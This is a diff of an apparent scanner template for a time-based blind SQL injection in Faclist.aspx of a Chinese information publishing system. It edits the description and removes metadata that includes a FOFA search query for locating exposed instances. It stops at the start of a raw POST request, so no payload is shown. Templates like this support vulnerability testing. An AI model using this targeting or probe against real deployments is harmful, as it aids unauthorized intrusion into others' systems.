@@ -3,14 +3,8 @@ info:
   name: 中宝信息发布系统Faclist.aspx存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eudog1ln67v0xolb
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: eudog1ln67v0xolb
-    fofa: title="医药商品信息发布系统"
 http:
 - raw:
   - 'POST /Factory/Faclist.aspx?id=2 HTTP/1.1
